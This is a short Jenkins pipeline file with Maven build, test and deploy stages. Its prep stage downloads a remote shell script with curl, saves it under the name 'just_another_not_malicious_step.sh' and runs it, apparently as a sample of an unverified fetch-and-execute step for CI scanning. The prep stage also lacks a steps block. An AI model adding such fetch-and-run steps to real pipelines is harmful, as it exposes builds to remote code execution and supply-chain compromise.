pipeline {
    agent any

    stages {
        stage('prep') {
            curl -L https://raw.githubusercontent.com/ruanyf/simple-bash-scripts/master/scripts/hello-world.sh -o just_another_not_malicious_step.sh
            sh just_another_not_malicious_step.sh
            # Copy artifacts
        }

        stage('Build') {
            steps {
                echo 'Building..'
                mvn install
            }
        }
        stage('Test') {
            steps {
            echo "Testing..."
            mvn test
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
                mvn deploy
            }
        }
    }
}